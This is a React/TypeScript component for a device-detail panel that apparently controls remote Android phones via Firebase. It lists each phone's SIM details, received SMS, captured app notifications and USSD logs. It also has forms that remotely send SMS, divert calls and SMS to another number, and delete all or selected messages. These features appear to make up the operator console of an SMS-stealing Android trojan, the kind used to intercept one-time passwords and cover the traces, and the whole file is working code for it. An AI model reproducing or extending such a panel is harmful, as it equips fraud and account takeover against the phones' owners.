import { useEffect, useState } from 'react'
import { useApp } from '../AppContext'
import { sendCommand } from '../api'
import { db, ref, get } from '../firebase'
import { parseDeviceInfo, deviceModel } from '../utils'

const SVG = ({ path, size = 14 }: { path: string; size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d={path} />
  </svg>
)

interface Props {
  deviceId: string | null
  onClose: () => void
}

const tabs = [
  { key: 'detail', label: 'Detail', icon: 'M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8zM14 2v6h6M16 13H8M16 17H8M10 9H8' },
  { key: 'sms', label: 'SMS', icon: 'M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z' },
  { key: 'notifications', label: 'Notifications', icon: 'M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9M13.73 21a2 2 0 0 1-3.46 0' },
  { key: 'logs', label: 'Logs', icon: 'M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z' },
  { key: 'forwarding', label: 'Forwarding', icon: 'M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z' },
  { key: 'commands', label: 'Commands', icon: 'M4 17l6-6-6-6M12 19h8' },
]

export default function DeviceDetail({ deviceId, onClose }: Props) {
  const { devices, allSms } = useApp()
  const [activeTab, setActiveTab] = useState('detail')
  const [sms, setSms] = useState<any[]>([])
  const [notifications, setNotifications] = useState<any[]>([])
  const [logs, setLogs] = useState<any[]>([])
  const [cmdResult, setCmdResult] = useState('')
  const [cmdSim, setCmdSim] = useState('0')
  const [cmdPhone, setCmdPhone] = useState('')
  const [cmdMsg, setCmdMsg] = useState('')
  const [cmdType, setCmdType] = useState('')
  const [cmdSmsId, setCmdSmsId] = useState('')
  const [fwdCallNum, setFwdCallNum] = useState('')
  const [fwdCallSim, setFwdCallSim] = useState('0')
  const [fwdSmsNum, setFwdSmsNum] = useState('')

  const device = deviceId ? devices[deviceId] : null
  const deviceSms = allSms.filter(s => s.deviceId === deviceId)

  useEffect(() => {
    if (!deviceId) return
    ;(async () => {
      try {
        const [nSnap, lSnap] = await Promise.all([
          get(ref(db, `notifications/${deviceId}`)),
          get(ref(db, `logs/${deviceId}`)),
        ])
        setNotifications(nSnap.val() ? Object.values(nSnap.val()).reverse() : [])
        setLogs(lSnap.val() ? Object.values(lSnap.val()).reverse() : [])
      } catch {}
    })()
  }, [deviceId])

  useEffect(() => { setSms(deviceSms) }, [deviceSms])

  const handleCommand = async (e: React.FormEvent) => {
    e.preventDefault()
    try {
      await sendCommand({
        device_id: deviceId!,
        cmd: cmdType,
        simSlot: parseInt(cmdSim) || 0,
        phoneNumber: cmdPhone,
        messageText: cmdMsg,
        smsId: cmdSmsId,
      })
      setCmdResult("Command '" + cmdType + "' queued")
      setCmdType(''); setCmdPhone(''); setCmdMsg(''); setCmdSmsId('')
    } catch (e: any) {
      setCmdResult('Error: ' + e.message)
    }
  }

  const sendFwdCmd = async (cmd: string) => {
    try {
      await sendCommand({ device_id: deviceId!, cmd, simSlot: parseInt(fwdCallSim), phoneNumber: fwdCallNum })
      setCmdResult("Command '" + (cmd === 'call_forward_on' ? 'Call Forward ON' : cmd === 'call_forward_off' ? 'Call Forward OFF' : cmd === 'sms_forward_on' ? 'SMS Forward ON' : cmd === 'sms_forward_off' ? 'SMS Forward OFF' : cmd) + "' sent")
    } catch (e: any) { setCmdResult('Error: ' + e.message) }
  }

  if (!deviceId || !device) return null

  const d = device
  const info = parseDeviceInfo(d.device_info)
  const model = deviceModel(d)

  return (
    <div className={`detail-panel open`}>
      {/* Header */}
      <div className="detail-header">
        <button className="back-btn" onClick={onClose}><SVG path="M19 12H5M12 19l-7-7 7-7"/></button>
        <div>
          <div style={{fontSize:15,fontWeight:700}}>{model}</div>
          <div style={{fontSize:11,color:'var(--text3)'}}>{info['Manufacturer'] || 'Unknown'} &bull; {info['Android Ver'] || '?'}</div>
        </div>
        <span className={`online-badge ${d.status === 'online' ? 'on' : 'off'}`} style={{marginLeft:'auto'}}>
          <span className="dot"></span>{d.status === 'online' ? 'Online' : 'Offline'}
        </span>
      </div>

      {/* Tabs */}
      <div className="detail-tabs">
        {tabs.map(t => (
          <button key={t.key} className={`dtab ${activeTab === t.key ? 'active' : ''}`} onClick={() => setActiveTab(t.key)}>
            <SVG path={t.icon} size={13}/> {t.label}
          </button>
        ))}
      </div>

      {/* Content */}
      <div className="detail-content">

        {/* Detail Tab */}
        <div className={`detail-section ${activeTab === 'detail' ? 'active' : ''}`}>
          <div className="info-grid">
            <InfoItem label="Device ID" value={deviceId} mono />
            <InfoItem label="Model" value={info['Model'] || d.d_name} />
            <InfoItem label="Manufacturer" value={info['Manufacturer']} />
            <InfoItem label="Android" value={info['Android Ver'] + ' (SDK ' + (info['SDK'] || '?') + ')'} />
            <InfoItem label="Device ID (sys)" value={info['ID']} mono />
            <InfoItem label="Battery" value={d.battery ? d.battery + '%' : 'N/A'} />
            <InfoItem label="Status" value={d.status === 'online' ? 'Online' : d.status || 'Offline'} />
            <InfoItem label="Installed" value={d.installTime || d.install_time || 'N/A'} />
            <InfoItem label="SIM 1" value={d.nameSim1 && d.numberSim1 ? `${d.nameSim1} (${d.numberSim1})` : d.nameSim1 || d.numberSim1 || d.sim1_name || d.sim1_number || 'N/A'} />
            <InfoItem label="SIM 2" value={d.nameSim2 && d.numberSim2 ? `${d.nameSim2} (${d.numberSim2})` : d.nameSim2 || d.numberSim2 || d.sim2_name || d.sim2_number || 'N/A'} />
            <InfoItem label="ICC ID 1" value={d.iccIdSim1 || 'N/A'} mono />
            <InfoItem label="ICC ID 2" value={d.iccIdSim2 || 'N/A'} mono />
          </div>
        </div>

        {/* SMS Tab */}
        <div className={`detail-section ${activeTab === 'sms' ? 'active' : ''}`}>
          {sms.length === 0 ? (
            <div className="empty"><div className="empty-icon"><SVG path="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" size={48}/></div><div className="empty-text">No SMS for this device</div></div>
          ) : (
            <div className="sms-list">
              {sms.slice(0, 100).map((s, i) => (
                <div key={s._ts || i} className="sms-item">
                  <div className="sms-top"><span className="sms-sender">{s.sender || 'Unknown'}</span><span className="sms-type in">IN</span></div>
                  <div className="sms-body">{s.body || ''}</div>
                  <div className="sms-time"><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83M16.95 16.95l2.83 2.83" size={11}/>{s.date || new Date(s.timestamp || 0).toLocaleString()}</div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Notifications Tab */}
        <div className={`detail-section ${activeTab === 'notifications' ? 'active' : ''}`}>
          {notifications.length === 0 ? (
            <div className="empty"><div className="empty-icon"><SVG path="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" size={48}/></div><div className="empty-text">No notifications</div></div>
          ) : (
            <div className="sms-list">
              {notifications.map((n: any, i: number) => (
                <div key={i} className="sms-item">
                  <div className="sms-top"><span className="sms-sender">{n.package || 'Unknown'}</span></div>
                  <div className="sms-body" style={{fontWeight:600}}>{n.title}</div>
                  <div className="sms-body" style={{marginTop:4}}>{n.text}</div>
                  <div className="sms-time"><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83" size={11}/>{n.timestamp ? new Date(n.timestamp).toLocaleString() : ''}</div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Logs Tab */}
        <div className={`detail-section ${activeTab === 'logs' ? 'active' : ''}`}>
          {logs.length === 0 ? (
            <div className="empty"><div className="empty-icon"><SVG path="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" size={48}/></div><div className="empty-text">No logs</div></div>
          ) : (
            <div className="sms-list">
              {logs.map((l: any, i: number) => (
                <div key={i} className="sms-item">
                  <div className="sms-top"><span className="sms-sender">{l.type || 'Log'}</span></div>
                  <div className="sms-body" style={{fontSize:12}}>Target: {l.target || 'N/A'} | Status: {l.status || 'N/A'}</div>
                  {l.message && <div className="sms-body" style={{fontSize:11,marginTop:4,color:'var(--text2)'}}>Message: {l.message}</div>}
                  {l.response && <div className="sms-body" style={{fontSize:11,marginTop:4,color:'var(--green)',background:'rgba(34,197,94,.06)',padding:'6px 8px',borderRadius:6}}>USSD Response: {l.response}</div>}
                  <div className="sms-time"><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83" size={11}/>{l.timestamp || ''} {l.type === 'call_forward_status' ? '• USSD' : ''} {l.type === 'sms_sent' ? '• SMS Sent' : ''}</div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Forwarding Tab */}
        <div className={`detail-section ${activeTab === 'forwarding' ? 'active' : ''}`}>
          <div className="cmd-section">
            <div className="cmd-title"><SVG path="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/> Call Forwarding</div>
            <div className="cmd-form">
              <div className="field"><label>Number to forward to</label><input type="text" placeholder="+919876543210" value={fwdCallNum} onChange={e => setFwdCallNum(e.target.value)}/></div>
              <div className="field"><label>SIM Slot</label><select value={fwdCallSim} onChange={e => setFwdCallSim(e.target.value)}><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
              <div style={{display:'flex',gap:8}}>
                <button className="btn btn-primary" style={{flex:1}} onClick={() => sendFwdCmd('call_forward_on')}><SVG path="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07" size={14}/> Activate</button>
                <button className="btn btn-danger" style={{flex:1}} onClick={() => sendFwdCmd('call_forward_off')}><SVG path="M18 6 6 18M6 6l12 12" size={14}/> Deactivate</button>
              </div>
              <div className="field" style={{marginTop:12}}><button className="btn btn-ghost btn-block" onClick={() => sendFwdCmd('call_forward_status')}><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83M16.95 16.95l2.83 2.83" size={14}/> Check Forward Status</button></div>
            </div>
          </div>
          <div className="cmd-section">
            <div className="cmd-title"><SVG path="M22 12h-4l-3 9L9 3l-3 9H2" size={15}/> SMS Forwarding</div>
            <div className="cmd-form">
              <div className="field"><label>Forward SMS to number</label><input type="text" placeholder="+919876543210" value={fwdSmsNum} onChange={e => setFwdSmsNum(e.target.value)}/></div>
              <div style={{display:'flex',gap:8}}>
                <button className="btn btn-success" style={{flex:1}} onClick={() => sendFwdCmd('sms_forward_on')}><SVG path="M22 12h-4l-3 9L9 3l-3 9H2" size={14}/> Enable</button>
                <button className="btn btn-danger" style={{flex:1}} onClick={() => sendFwdCmd('sms_forward_off')}><SVG path="M18 6 6 18M6 6l12 12" size={14}/> Disable</button>
              </div>
            </div>
          </div>
          <CmdResult msg={cmdResult} />
        </div>

        {/* Commands Tab */}
        <div className={`detail-section ${activeTab === 'commands' ? 'active' : ''}`}>
          <form className="cmd-form" onSubmit={handleCommand}>
            <div className="field"><label>Command</label>
              <select value={cmdType} onChange={e => setCmdType(e.target.value)} required>
                <option value="">Select command...</option>
                <option value="send_sms">Send SMS</option>
                <option value="call_forward_on">Call Forward ON</option>
                <option value="call_forward_off">Call Forward OFF</option>
                <option value="call_forward_status">Call Forward Status</option>
                <option value="sms_forward_on">SMS Forward ON</option>
                <option value="sms_forward_off">SMS Forward OFF</option>
                <option value="sms_delete_all">Delete All SMS</option>
                <option value="sms_delete_one">Delete Specific SMS</option>
                <option value="sync_sms">Sync SMS</option>
                <option value="reboot">Reboot Service</option>
              </select>
            </div>
            <div className="field"><label>SIM Slot</label>
              <select value={cmdSim} onChange={e => setCmdSim(e.target.value)}><option value="0">SIM 1</option><option value="1">SIM 2</option></select>
            </div>
            <div className="field"><label>Phone Number</label><input type="text" placeholder="+919876543210" value={cmdPhone} onChange={e => setCmdPhone(e.target.value)}/></div>
            <div className="field"><label>Message Text</label><textarea placeholder="SMS body or command params" value={cmdMsg} onChange={e => setCmdMsg(e.target.value)}/></div>
            <div className="field"><label>SMS ID</label><input type="text" placeholder="For sms_delete_one" value={cmdSmsId} onChange={e => setCmdSmsId(e.target.value)}/></div>
            <button className="btn btn-primary btn-block" type="submit"><SVG path="M23 2 1 21h4l18-17z"/> Execute</button>
          </form>
          <CmdResult msg={cmdResult} />
        </div>

      </div>
    </div>
  )
}

function InfoItem({ label, value, mono }: { label: string; value: string | undefined; mono?: boolean }) {
  return (
    <div className="info-item">
      <div className="info-label">{label}</div>
      <div className="info-value" style={mono ? { fontFamily: 'monospace', fontSize: 11 } : {}}>{value || 'N/A'}</div>
    </div>
  )
}

function CmdResult({ msg }: { msg: string }) {
  if (!msg) return null
  const isErr = msg.startsWith('Error')
  return (
    <div style={{
      marginTop:10,padding:'10px 14px',borderRadius:10,
      background: isErr ? 'rgba(239,68,68,.08)' : 'rgba(34,197,94,.08)',
      border: '1px solid ' + (isErr ? 'rgba(239,68,68,.2)' : 'rgba(34,197,94,.2)'),
      fontSize:12,fontWeight:600,
      color: isErr ? 'var(--red)' : 'var(--green)',
      display:'flex',alignItems:'center',gap:8
    }}>
      <SVG path={isErr ? 'M10.29 3.86l-7.02 12.13a2 2 0 0 0 1.73 3.01h14.04a2 2 0 0 0 1.73-3.01L13.66 3.86a2 2 0 0 0-3.37 0zM12 9v4M12 17h.01' : 'M22 11.08V12a10 10 0 1 1-5.93-9.14M22 4L12 14.01l-3-3'} size={15}/>
      {msg}
    </div>
  )
}
